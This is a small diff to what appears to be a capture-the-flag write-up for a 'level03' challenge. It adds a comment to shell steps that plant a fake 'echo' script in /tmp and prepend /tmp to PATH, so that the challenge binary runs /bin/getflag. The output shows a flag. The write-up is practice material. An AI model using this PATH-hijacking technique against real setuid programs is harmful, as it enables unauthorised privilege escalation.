@@ -38,7 +38,7 @@ getflag: /bin/getflag
 ```b
 > echo -e "#\!/bin/bash\n/bin/getflag" > /tmp/echo
 > chmod +x /tmp/echo
-> export PATH=/tmp:$PATH
+> export PATH=/tmp:$PATH  👈 prepend tmp to get it checked first
 > ./level03
 # qi0maab88jeaj46qoumi7maus
 ```
